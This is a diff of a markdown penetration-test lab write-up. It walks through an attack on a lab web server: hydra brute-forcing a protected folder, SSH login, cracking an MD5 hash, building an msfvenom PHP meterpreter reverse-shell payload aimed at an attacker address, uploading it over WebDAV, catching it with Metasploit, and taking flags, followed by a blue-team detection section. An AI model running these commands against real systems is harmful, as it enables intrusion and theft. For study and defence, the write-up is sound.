@@ -65,15 +65,19 @@ As this is a webserver, we can investigate further from a browser in the attacke
 In a text document the blog directory we can see a 3rd potential username – Ryan, who would potentially have the highest level access as CEO:
 
 ![11](Images1/11.PNG)
+
 In the _company folders_ directory, we can see reference to a &quot;_secret\_folder_&quot; in ALL documents within this directory, which is now a target for this Penetration Test.
 
 ![12](Images1/12.PNG)
+
 The _meet\_our\_team_ folder confirms the three potential users, and each document references the _secret\_folder:_
 
 ![13](Images1/13.PNG)
+
 As we can see below, we will need Ashton&#39;s password to gain access to the secure hidden folder.
 
 ![14](Images1/14.PNG)
+
 ### **Vulnerability scan:**
 
 ```
@@ -92,6 +96,7 @@ Aggressive scan with a vulnerability script reveals:
 ![16](Images1/16.PNG)
 ![17](Images1/17.PNG)
 ![18](Images1/18.PNG)
+
 ### **Bruteforce:**
 
 Now that we have some usernames and a main target - Ashton, using hydra we can attempt to bruteforce the login for the _secret\_folder_.
@@ -103,6 +108,7 @@ hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/compan
 ```
 
 ![19](Images1/19.PNG)
+
 ### **SSH:**
 
 ```
@@ -113,6 +119,7 @@ Using Ashton's credentials we could gain ssh entry into the server.
 
 ![20](Images1/20.PNG)
 ![21](Images1/21.PNG)
+
 #### **Flag 1**
 
 In the root home directory we could pickup a flag.
@@ -121,6 +128,7 @@ In the root home directory we could pickup a flag.
 Using the same credentials, we could access the protected hidden folder.
 
 ![23](Images1/23.PNG)
+
 ### **Password hash:**
 
 Within this folder was a document with instructions to connect to a _corp\_server_. Included in the document are Ryan&#39;s hashed credentials and reference to a webdav directory
@@ -130,12 +138,14 @@ Within this folder was a document with instructions to connect to a _corp\_serve
 Th hashed md5 password was instantly cracked using Crackstation, revealing the password _linux4u_
 
 ![26](Images1/26.PNG)
+
 ### **Webdav:**
 
 We could then login to webdav using Ryan&#39;s credentials.
 
 ![27](Images1/27.PNG)
 ![28](Images1/28.PNG)
+
 ### **Reverse Shell:**
 
 #### **Msfvenom**
@@ -149,6 +159,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o 
 Using msfvenom we created a payload – shell.php
 
 ![29](Images1/29.PNG)
+
 #### **Cadaver**
 
 ```
@@ -159,6 +170,7 @@ Using cadaver and Ryan's credentials we accessed webdav, and uploaded the payloa
 
 ![30](Images1/30.PNG)
 ![31](Images1/31.PNG)
+
 #### **Metasploit**
 
 ```
@@ -169,9 +181,11 @@ use multi/handler
 Once the payload was successfully uploaded, in order to create the reverse shell, we setup a listener using Metasploit.
 
 ![32](Images1/32.PNG)
+
 After loading the exploit and activating the shell.php we uploaded earlier by clicking on it on the webserver, the target server connected to our listener and launched a meterpreter session into their system.
 
 ![33](Images1/33.PNG)
+
 ### **Gaining Interactive Shell:**
 
 ```
@@ -179,6 +193,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ![34](Images1/34.PNG)
+
 ### **Finding Flag 2:**
 
 The next flag was located in the root directory.
@@ -188,6 +203,7 @@ Exit back to meterpreter.
 
 ![36](Images1/36.PNG)
 ![37](Images1/37.PNG)
+
 ### **Exfiltration:**
 
 The file was easily exfiltrated back to the attacker machine.
@@ -322,17 +338,20 @@ This vulnerability relates to malicious filenames, in which the end of filenames
 
 ![40](Images1/40.PNG)
 ![41](Images1/41.PNG)
+
 **Monitoring requests to the &quot;** _ **secret\_folder** _ **&quot;:**
 
 ![42](Images1/42.PNG)
 ![43](Images1/43.PNG)
 ![44](Images1/44.PNG)
+
 **Filtering for the Hydra brute force attack:**
 
 There were 346,595 bruteforce attempts made with Hydra.
 
 ![45](Images1/45.PNG)
 ![46](Images1/46.PNG)
+
 **Finding the WebDAV connection:**
 
 A reverse shell in webdav was used 20 times.
@@ -345,5 +364,6 @@ A reverse shell in webdav was used 20 times.
 
 # **BLUE TEAM**
 ## **Proposed Alarms and Mitigation Strategies**
+
 ![](Images1/.PNG)
 
